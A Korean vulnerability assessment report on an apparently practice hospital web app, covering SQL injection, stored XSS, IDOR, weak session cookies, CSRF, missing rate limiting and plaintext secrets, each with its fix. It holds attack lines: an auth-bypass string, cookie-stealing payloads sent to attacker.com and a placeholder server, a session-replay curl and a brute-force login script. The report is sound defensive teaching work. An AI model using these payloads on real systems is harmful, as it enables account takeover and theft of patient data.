# vuln-report-consolidated

# 🛡️ 미소 병원 3-Tier 웹 프로젝트 취약점 분석 종합 보고서

## 0. 개요

| 항목 | 내용 |
| --- | --- |
| **프로젝트명** | 미소 병원 3-Tier 기반 웹 시스템 |
| **아키텍처** | Frontend(정적 HTML/JS) - WAS(Node.js/Express) - DB(MariaDB) |
| **분석 계층** | Frontend: `index.html`, `login.js`, `board.js`, `view.js` / WAS: `was/routes/auth.js`, `was/routes/board.js`, `was/server.js` / DB: `db/init.sql` |
| **PoC** | `poc/brute_force_login.py`, `poc/csrf-attack.html` |
| **총 발견 취약점** | 11건 |
| **OWASP 기준 버전** | Top 10:2025 |

### 심각도 기준

🔴🔴🔴 CRITICAL  ·  🔴🔴 HIGH  ·  🔴 MEDIUM  ·  🟡 LOW

### 전체 취약점 요약표

| # | 취약점명 | 위치 | OWASP (2025) | CWE | 심각도 |
| --- | --- | --- | --- | --- | --- |
| 1 | SQL Injection | `auth.js` `/login` | A05:2025 - 인젝션 | CWE-89 | 🔴🔴🔴 CRITICAL |
| 2 | Stored XSS | `board.js`(WAS/FE), `view.js` | A05:2025 - 인젝션 | CWE-79 | 🔴🔴🔴 CRITICAL |
| 3 | BOLA / IDOR | `board.js` `GET /:patientId` | A01:2025 - 충분한 접근 제어 | CWE-639 | 🔴🔴🔴 CRITICAL |
| 4 | 불충분한 세션 관리 | `server.js` 세션 쿠키 설정 | A07:2025 - 인증 실패 | CWE-1004, CWE-614, CWE-384 | 🔴🔴🔴 CRITICAL |
| 5 | CSRF | `server.js` CORS 설정 + 토큰 부재 | A01:2025 - 충분한 접근 제어 | CWE-352 | 🔴🔴 HIGH |
| 6 | Rate Limiting 부재 (자동화 공격) | `auth.js` `/login` | A07:2025 - 인증 실패 | CWE-770, CWE-799, CWE-307 | 🔴🔴 HIGH |
| 7-a | 정보 노출 (HTML 주석) | `index.html` | A02:2025 - 보안 설정 오류 | CWE-200 | 🔴🔴 HIGH |
| 7-b | 정보 노출 (에러메시지) | `auth.js` 에러 응답 | A10:2025 - 부적절한 예외 처리 | CWE-215 | 🔴🔴 HIGH |
| 8 | 평문 비밀번호 저장 | `auth.js` `/signup`, `init.sql` | A04:2025 - 암호 체계 실패 | CWE-256, CWE-916 | 🔴🔴🔴 CRITICAL |
| 9 | 고유식별정보(주민번호) 미암호화 | `init.sql` `rrn` 컬럼 | A04:2025 - 암호 체계 실패 | CWE-311 | 🔴🔴 HIGH |
| 10 | User Enumeration | `auth.js` `/signup` | A07:2025 - 인증 실패 | CWE-203 | 🔴 MEDIUM |
| 11 | 전송 구간 암호화 부재 (HTTPS 미적용) | `server.js` 전체 | A04:2025 - 암호 체계 실패 | CWE-319 | 🔴 MEDIUM |

---

## 1. SQL Injection

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `was/routes/auth.js`, `POST /api/login` |
| **OWASP** | A05:2025 - 인젝션 |
| **CWE** | CWE-89 |
| **심각도** | 🔴🔴🔴 CRITICAL |

**원인**: 사용자 입력값을 검증·이스케이프 없이 SQL 쿼리 문자열에 직접 결합.

```jsx
// [취약한 코드]
const query = `SELECT * FROM patients WHERE username = '${username}' AND password = '${password}'`;
const [rows] = await pool.query(query);
```

**공격 시나리오**
1. 로그인 폼 아이디에 `' OR '1'='1' --` (맨 끝 공백 포함) 입력, 비밀번호는 임의값 입력
2. `WHERE` 절이 `username = '' OR '1'='1' -- ...`로 조작되어 조건이 항상 참이 됨
3. 첫 번째 계정으로 인증 우회 로그인 성공

**대응 방안**: Prepared Statement(파라미터 바인딩) 적용

```jsx
// [안전한 코드]
const query = "SELECT * FROM patients WHERE username = ? AND password = ?";
const [rows] = await pool.query(query, [username, password]);
```

비밀번호는 평문 비교가 아닌 해시(bcrypt) 비교 방식으로 전환 필요 (8번 항목 참고).

---

## 2. Stored XSS (Cross-Site Scripting)

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `was/routes/board.js`(`POST /`), `frontend/js/board.js`(`renderPost`), `frontend/js/view.js`(`loadPost`) |
| **OWASP** | A05:2025 - 인젝션 |
| **CWE** | CWE-79 |
| **심각도** | 🔴🔴🔴 CRITICAL |

**개념**: 공격자가 악성 스크립트를 웹 페이지에 삽입해, 그 페이지를 보는 **다른 사용자의 브라우저**에서 스크립트가 실행되게 만드는 취약점. 서버가 아니라 피해자의 브라우저가 공격 대상.

| 종류 | 설명 |
| --- | --- |
| Stored XSS (저장형) | 악성 스크립트가 서버(DB)에 저장되어, 해당 페이지를 볼 때마다 반복 실행 (본 프로젝트 해당) |
| Reflected XSS (반사형) | URL 파라미터 등에 담아 1회성 링크 클릭 유도로 실행 |
| DOM-based XSS | 서버를 거치지 않고 클라이언트 JS가 신뢰할 수 없는 값을 DOM에 직접 반영 |

**원인**: 서버는 저장 시 sanitize하지 않고, 클라이언트는 렌더링 시 `innerHTML`을 사용해 escape 없이 삽입.

```jsx
// [취약한 코드 - 저장]
const [result] = await pool.query(
  "INSERT INTO board_posts (patient_id, title, content) VALUES (?, ?, ?)",
  [req.session.patientId, title, content] // 값 자체에 대한 sanitize 없음
);
```

```jsx
// [취약한 코드 - 렌더링]
li.innerHTML = `<a href="view.html?patient_id=${post.patient_id}">${post.title}</a>`;
```

**공격 시나리오**
1. 로그인한 공격자가 “증상 남기기” 제목에 `<script>fetch('http://attacker.com?c='+document.cookie)</script>` 입력 후 등록
2. DB `board_posts.title`에 페이로드가 문자열 그대로 저장됨 (DB 직접 조회로 확인 가능)
3. **BOLA/IDOR와 결합**: 타 사용자가 `patient_id`만 바꿔 이 글에 접근하면, `innerHTML` 렌더링 시 스크립트가 그대로 실행 → 저장형 XSS가 IDOR을 경유해 타인에게도 실행되는 연쇄 공격
4. 실행된 스크립트가 `document.cookie`로 세션 쿠키 탈취 (4번 항목 `httpOnly:false`와 직결)

**대응 방안**: 서버 측 저장 전 정제(`sanitize-html`/`DOMPurify`) 또는 클라이언트에서 `innerHTML` 대신 `textContent` 사용.

```jsx
// [안전한 코드]
const a = document.createElement('a');
a.href = `view.html?patient_id=${post.patient_id}`;
a.textContent = post.title; // 스크립트로 해석되지 않고 순수 텍스트로 표시
li.appendChild(a);
```

---

## 3. BOLA / IDOR (Broken Object Level Authorization)

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `was/routes/board.js`, `GET /api/board/:patientId` |
| **OWASP** | A01:2025 - 충분한 접근 제어 |
| **CWE** | CWE-639 |
| **심각도** | 🔴🔴🔴 CRITICAL |

**개념**: 사용자가 요청 파라미터(URL, ID 등)를 조작해 권한이 없는 타인의 데이터에 접근하는 취약점. IDOR은 이전 명칭, BOLA는 OWASP API Top 10에서 이를 재정의한 명칭으로 동일 개념.

**원인**: 서버가 “로그인 여부”(인증, Authentication)는 확인하지만, “이 리소스가 요청자 소유인지”(인가, Authorization)는 확인하지 않음.

```jsx
// [취약한 코드]
router.get("/:patientId", async (req, res) => {
  if (!req.session.patientId) { /* 인증만 체크 */ }
  // req.params.patientId 가 req.session.patientId 와 같은지 검증 없음
  const [rows] = await pool.query(
    `SELECT bp.id, bp.patient_id, bp.title, bp.content, p.name
     FROM board_posts bp JOIN patients p ON p.id = bp.patient_id
     WHERE bp.patient_id = ?`,
    [req.params.patientId]
  );
  res.json(rows);
});
```

목록 조회(`GET /`)는 `req.session.patientId`를 쓰는데, 상세 조회(`GET /:patientId`)만 `req.params.patientId`(URL 값)를 그대로 쓰는 비대칭이 취약점의 본질.

**공격 시나리오**
1. `patientId=1`(김환자)로 로그인
2. 본인 문의 클릭 시 `view.html?patient_id=1`로 이동 — 정상 동작
3. 주소창에서 `patient_id`를 `2`, `3`으로 직접 변경
4. 서버가 소유권을 검증하지 않아 이몽룡, 성춘향의 진료 문의(제목+내용)가 그대로 반환·렌더링됨

**대응 방안**: 서버에서 URL 파라미터와 세션 소유자 일치 여부를 검증.

```jsx
// [안전한 코드]
if (Number(req.params.patientId) !== req.session.patientId) {
  return res.status(403).json({ message: "접근 권한이 없습니다." });
}
```

더 근본적으로는 URL에서 `patientId`를 아예 받지 않고 세션 값만 사용하는 방식으로 공격 표면 자체를 제거하는 것이 바람직함.

---

## 4. 불충분한 세션 관리

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `was/server.js`, 13~20행 (세션 쿠키 설정) |
| **OWASP** | A07:2025 - 인증 실패 |
| **CWE** | CWE-1004, CWE-614, CWE-384, CWE-488 |
| **심각도** | 🔴🔴🔴 CRITICAL |

```jsx
// [취약한 코드]
session({
  secret: config.sessionSecret,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: false, // 취약점 1
    // secure: true   // 취약점 2 (미설정)
    // sameSite 미설정 // 취약점 3
  }
})
```

| 항목 | 설명 |
| --- | --- |
| `httpOnly: false` | JavaScript `document.cookie`로 세션 쿠키에 접근 가능 → 2번(XSS)과 결합 시 세션 탈취로 직결 |
| `secure` 미설정 | HTTP 평문 통신 시 쿠키가 암호화 없이 전송 (11번 항목과 연결) |
| `sameSite` 미설정 | CSRF 방어에 필요한 쿠키 전송 제한이 없음 (5번 항목과 직결) |

**공격 시나리오 (PoC)** — 본인이 소유/구축한 실습 환경에서만 수행

1. 정상 로그인 후 브라우저 개발자도구 콘솔에서 `document.cookie` 실행 → 세션 쿠키 값이 그대로 노출됨 (`httpOnly: true`였다면 접근 불가해야 정상)
2. (XSS 취약점과 결합 시) 공격자가 삽입한 스크립트가 피해자 브라우저에서 실행되어 쿠키를 원격으로 자동 전송 가능:
    
    ```jsx
    fetch('http://공격자서버/steal?cookie=' + encodeURIComponent(document.cookie))
    ```
    
    이 경로가 통하는 이유는 `httpOnly`가 꺼져 있어 스크립트가 쿠키 값을 읽을 수 있기 때문이며, XSS 취약점 자체는 2번 항목에서 별도로 다룸
    
3. (`secure` 미설정 악용) HTTPS가 아닌 HTTP로 통신할 경우, 같은 네트워크 상에서 패킷 스니핑(예: Wireshark)만으로도 쿠키가 평문으로 노출됨
4. 위 방법으로 얻은 세션 값을 로그인 절차 없이 새 요청에 그대로 주입:
    
    ```bash
    curl -i -H "Cookie: connect.sid=<탈취한_세션값>" http://localhost:3000/api/me
    ```
    
    자격증명 없이 피해자 계정으로 인증된 응답이 오면 세션 하이재킹 성립
    

**대응 방안**

```jsx
// [안전한 코드]
cookie: {
  httpOnly: true,     // JS에서 쿠키 접근 차단
  secure: true,        // HTTPS 환경에서만 전송
  sameSite: 'Strict',  // CSRF 방어
  maxAge: 30 * 60 * 1000, // 세션 만료시간 설정
}
```

- `config.sessionSecret`은 환경 변수로 분리하고 충분한 엔트로피를 갖도록 설정
- 유휴 세션 자동 만료 적용
- 배포 환경은 반드시 HTTPS로 운영해 `secure: true`가 실효성을 갖도록 구성

---

## 5. CSRF (Cross-Site Request Forgery)

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `was/server.js` (`cors({origin:true, credentials:true})`), 토큰 검증 로직 부재 |
| **OWASP** | A01:2025 - 충분한 접근 제어 |
| **CWE** | CWE-352 |
| **심각도** | 🔴🔴 HIGH |

**개념**: 로그인 상태인 피해자의 브라우저가 본인 의사와 무관하게 공격자가 의도한 요청(게시글 작성 등)을 서버로 전송하게 만드는 취약점. 브라우저는 요청 시 해당 도메인의 인증 쿠키를 자동 첨부하는데, 서버가 이 쿠키만으로 요청을 신뢰하면 발생.

```jsx
// [취약한 코드]
// "어느 오리진에서 온 요청이든 쿠키를 실어 보내는 것"을 허용
app.use(cors({ origin: true, credentials: true }));
// /api/board POST에 CSRF 토큰 검증 없음
```

**공격 시나리오** (`poc/csrf-attack.html`)
1. 피해자가 미소병원에 로그인한 상태로 별도 오리진의 악성 페이지 접속
2. 악성 페이지의 버튼 클릭(또는 자동실행) 시 `fetch('http://<WAS>/api/board', {credentials:'include', ...})` 실행
3. CORS 설정이 모든 오리진을 허용 + 쿠키 자동 첨부로 인해, 피해자 명의로 악성 게시글이 등록됨

**대응 방안**: CSRF 토큰(Synchronizer Token Pattern) 도입 + SameSite 쿠키 속성 설정.

```jsx
// [안전한 코드]
app.post('/api/board', (req, res) => {
  const clientToken = req.headers['x-csrf-token'];
  if (!clientToken || clientToken !== req.session.csrfToken) {
    return res.status(403).json({ message: "유효하지 않은 CSRF 토큰입니다." });
  }
  // 정상 처리
});
```

CORS는 실제 신뢰하는 프론트엔드 오리진만 명시적으로 허용하도록 변경 (`origin: true` 지양).

---

## 6. Rate Limiting 부재 (자동화 공격 / 브루트포스)

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `was/routes/auth.js`, `POST /api/login` |
| **OWASP** | A07:2025 - 인증 실패 |
| **CWE** | CWE-770, CWE-799, CWE-307 |
| **심각도** | 🔴🔴 HIGH |

**원인**
- `/api/login` 라우터에 요청 횟수를 제한하는 미들웨어(`express-rate-limit` 등)가 적용되어 있지 않음
- IP 또는 계정 단위의 시도 횟수를 추적/기록하는 로직이 없어 실패한 로그인 시도가 누적되지 않음
- 로그인 실패 시 지연(delay)이나 잠금(lockout) 처리가 없어 요청이 들어오는 즉시 즉각 처리됨
- 인증 엔드포인트를 별도로 취급하지 않고 일반 API와 동일하게 무제한 호출을 허용하는 구조

**위험성**

| 구분 | 설명 |
| --- | --- |
| 브루트포스 공격 | 자동화 스크립트로 비밀번호를 무제한 대입 시도하여 취약한 비밀번호 계정이 탈취될 수 있음 |
| 크리덴셜 스터핑 | 유출된 아이디/비밀번호 조합을 대량으로 대입해 재사용 계정을 찾아낼 수 있음 |
| 서비스 가용성 저하(DoS) | 대량 요청이 DB 조회(`pool.query`)로 이어져 서버·DB 자원이 고갈되고 정상 사용자의 서비스 이용이 지연·차단될 수 있음 |
| 개인정보(환자 정보) 유출 위험 | `patients` 테이블 대상 인증이므로, 계정 탈취 시 민감한 의료·개인정보에 접근 가능 |
| 2차 피해 확산 | 계정 탈취 후 4번 항목(세션 쿠키 노출)과 결합되면 세션 하이재킹 등 피해 범위가 더욱 커짐 |

**공격 시나리오 (PoC)** — 본인이 소유/구축한 실습용 DB 계정에만 수행 (`poc/brute_force_login.py`)

1. 대상 계정(예: `patient1`)을 정하고, 비밀번호 후보 목록으로 지연 없이 연속 `POST /api/login` 요청을 보내는 스크립트를 작성:
    
    ```python
    import requests
    
    candidates = ["1234", "password", "admin", "qwerty", "pass1234", "123456"]
    for pw in candidates:
        r = requests.post(
            "http://localhost:3000/api/login",
            json={"username": "patient1", "password": pw},
        )
        print(pw, "->", r.status_code)
    ```
    
2. 실행 결과, 요청마다 즉시 응답이 오고 차단·지연·CAPTCHA·계정 잠금이 전혀 발생하지 않음을 확인
3. 후보 목록에 실제 비밀번호(예: `pass1234`)가 포함되어 있으면 해당 시도에서 `200 OK`가 반환되며 로그인 성공 → 계정 탈취 확인

**대응 방안**: `express-rate-limit` 적용 + 계정 단위 잠금 병행.

```jsx
// [안전한 코드]
const rateLimit = require("express-rate-limit");
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15분
  max: 5,                    // 최대 5회
  message: "너무 많은 로그인 시도. 나중에 다시 시도하세요.",
});
router.post("/login", loginLimiter, async (req, res) => { /* ... */ });
```

---

## 7-a. 정보 노출 — 테스트 계정 주석

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `frontend/index.html` (HTML 주석) |
| **OWASP** | A02:2025 - 보안 설정 오류 |
| **CWE** | CWE-200 |
| **심각도** | 🔴🔴 HIGH |

**원인**: 개발 중 남긴 테스트 계정 주석이 프로덕션 코드에 그대로 남아 브라우저를 통해 외부에 노출됨.

```html
<!-- [취약한 코드] -->
<!-- Admin Test Account: admin / admin_test_123! -->
```

**공격 시나리오**: 개발자도구(F12) → Elements 탭에서 관리자 테스트 계정 주석 확인, 그대로 로그인.

**대응 방안**: 배포 전 모든 개발용 주석·테스트 계정 제거. CI/CD에 SAST 도구를 연동해 `admin`, `password` 등 민감 키워드가 포함된 코드가 자동으로 배포되지 않도록 차단.

---

## 7-b. 정보 노출 — 에러 메시지를 통한 내부 구조 노출

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `was/routes/auth.js` (에러 응답의 `err.sqlMessage`) |
| **OWASP** | A10:2025 - 부적절한 예외 처리 (2025년 신설 카테고리) |
| **CWE** | CWE-215 |
| **심각도** | 🔴🔴 HIGH |

**원인**: 예외 처리 시 상세 에러 정보를 그대로 클라이언트 응답에 포함. 단순 “보안 설정”의 문제라기보다, 예외적 상황(SQL 문법 오류 등)을 다루는 로직 자체가 부적절하게 설계된 경우라 2025년 신설 카테고리(A10)에 더 정확히 부합.

```jsx
// [취약한 코드]
res.status(500).json({ success: false, message: "쿼리 오류", detail: err.sqlMessage });
```

**공격 시나리오**: 의도적으로 SQL 문법 오류를 유발하는 입력 전달 → 응답의 `sqlMessage`로 테이블/컬럼명, DB 종류 등 내부 구조 파악 → SQLi 공격 정교화에 활용.

**대응 방안**: 사용자 응답에는 일반 메시지만 반환하고, 상세 에러는 서버 로그에만 기록.

```jsx
// [안전한 코드]
catch (err) {
  console.error(err); // 서버 로그에만 기록
  res.status(500).json({ success: false, message: "서버 오류가 발생했습니다." });
}
```

---

## 8. 평문 비밀번호 저장

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `was/routes/auth.js` `/signup`, `db/init.sql` |
| **OWASP** | A04:2025 - 암호 체계 실패 |
| **CWE** | CWE-256, CWE-916 |
| **심각도** | 🔴🔴🔴 CRITICAL |

```jsx
// [취약한 코드]
const [result] = await pool.query(
  "INSERT INTO patients (username, password, name, rrn) VALUES (?, ?, ?, ?)",
  [username, password, name, rrn] // password 평문 그대로
);
```

**위험성**: SQL Injection 등으로 DB가 유출되거나 내부 관리자가 악의적으로 조회할 경우 모든 사용자 비밀번호가 그대로 노출. 다수 사용자가 여러 서비스에서 비밀번호를 재사용하므로 은행·이메일 등 타 계정까지 연쇄 피해로 이어질 수 있음.

**대응 방안**: 단방향 해시(bcrypt/argon2) 처리. 단순 해시(SHA-256 등)만으로는 salt·계산비용 조절이 없어 부족.

```jsx
// [안전한 코드]
const bcrypt = require('bcrypt');
const hashed = await bcrypt.hash(password, 10);
// 로그인 시: await bcrypt.compare(입력값, hashed)
```

---

## 9. 고유식별정보(주민등록번호) 미암호화

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `db/init.sql`, `patients.rrn` 컬럼 |
| **OWASP** | A04:2025 - 암호 체계 실패 |
| **CWE** | CWE-311 |
| **심각도** | 🔴🔴 HIGH |

**법적 근거**: 개인정보보호법 제24조의2 — 주민등록번호는 법령 근거 없이 원칙적으로 수집 금지, 부득이하게 처리 시 암호화 의무. 병원처럼 실제로 주민번호를 다뤄야 하는 업종도 예외 없이 적용.

**현황**: API 응답에는 `rrn`이 포함되지 않으나(다행), DB 저장 자체가 암호화되어 있지 않음.

**대응 방안**: AES 등 대칭키 암호화 적용 (비밀번호와 달리 복호화가 필요할 수 있어 단방향 해시 사용 불가). 화면 표시가 필요해지면 반드시 마스킹 처리.

```
예: 990101-1234567 → 990101-1******
```

---

## 10. User Enumeration (사용자 계정 목록화)

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `was/routes/auth.js` `/signup` |
| **OWASP** | A07:2025 - 인증 실패 |
| **CWE** | CWE-203 |
| **심각도** | 🔴 MEDIUM |

```jsx
// [취약한 코드]
if (existing.length > 0) {
  return res.status(409).json({ success: false, message: "이미 존재하는 아이디입니다." });
}
```

**위험성**: 직접적인 개인정보 유출은 아니지만, “이 아이디로 가입한 사람이 존재한다”는 사실 자체가 민감정보(그 병원 이용 여부)와 연결될 수 있음. 공격자는 이를 이용해 실제 존재 계정만 추려 브루트포스 대상을 좁히거나, 특정인의 환자 여부를 추정하는 사전 정찰에 활용.

**대응 방안**: 성공/실패 메시지를 동일하게 처리하거나, 중복 시 이메일/SMS 등 별도 채널로만 안내.

---

## 11. 전송 구간 암호화 부재 (HTTPS 미적용)

| 항목 | 내용 |
| --- | --- |
| **파일 / 위치** | `was/server.js` 전체 (HTTP로만 서비스) |
| **OWASP** | A04:2025 - 암호 체계 실패 |
| **CWE** | CWE-319 |
| **심각도** | 🔴 MEDIUM |

**위험성**: 공용 와이파이 등 동일 네트워크의 제3자가 패킷을 스니핑하면, 로그인 시 아이디·비밀번호, 세션 쿠키가 평문으로 그대로 노출됨.

**대응 방안**: 실제 배포 시 TLS 인증서 적용해 HTTPS로 전환. 쿠키에 `secure: true` 설정해 HTTPS에서만 전송되도록 강제 (4번 항목과 연동).

---

## 12. 취약점 간 연관관계

여러 취약점이 개별적으로도 위험하지만, **조합될 때 피해가 증폭**되는 구조입니다.

```
[2] Stored XSS ──(스크립트 실행)──▶ document.cookie 탈취
        │                                    ▲
        │ (렌더링 경유)                       │ (httpOnly:false)
        ▼                                    │
[3] BOLA/IDOR ──(타인 글 열람 시 XSS 실행)──▶ [4] 불충분한 세션 관리

[5] CSRF ──(CORS 오설정 + 쿠키 자동첨부)──▶ 피해자 명의 요청 위조

[1] SQL Injection ──(인증 우회)──▶ [8] 평문 비밀번호 ──▶ 계정 탈취 시 즉시 원문 노출

[6] Rate Limiting 부재 ──(무제한 시도)──▶ [8] 평문/약한 비밀번호 크랙
```

**종합 위험도**: 1~4번(SQLi, XSS, BOLA, 세션관리)은 인증·인가 체계의 핵심 구간에 위치하며 서로 결합 시 파급력이 가장 크므로 최우선 조치가 필요합니다.

---

## 13. 향후 보안 점검 체크리스트

- [ ]  모든 DB 쿼리에 Prepared Statement(파라미터 바인딩) 적용 여부 확인
- [ ]  사용자 입력을 출력하는 모든 지점에서 `innerHTML` 대신 `textContent`/이스케이프 처리 확인
- [ ]  리소스 ID를 파라미터로 받는 모든 API에 “요청자 소유 확인” 로직 존재 여부 확인
- [ ]  세션 쿠키에 `httpOnly`, `secure`, `sameSite` 속성 적용 여부 점검
- [ ]  데이터 변경(POST/PUT/DELETE) 요청에 CSRF 토큰 검증 로직 존재 여부 확인
- [ ]  로그인 등 인증 엔드포인트에 Rate Limiting 적용 여부 확인
- [ ]  배포 전 소스코드 내 주석·테스트 계정·`console.log` 전수 조사
- [ ]  비밀번호는 bcrypt/argon2 해시, 주민번호 등 고유식별정보는 AES 암호화 적용 여부 확인
- [ ]  회원가입/로그인 응답 메시지가 계정 존재 여부를 노출하지 않는지 확인
- [ ]  배포 환경이 HTTPS로 전환되었는지 확인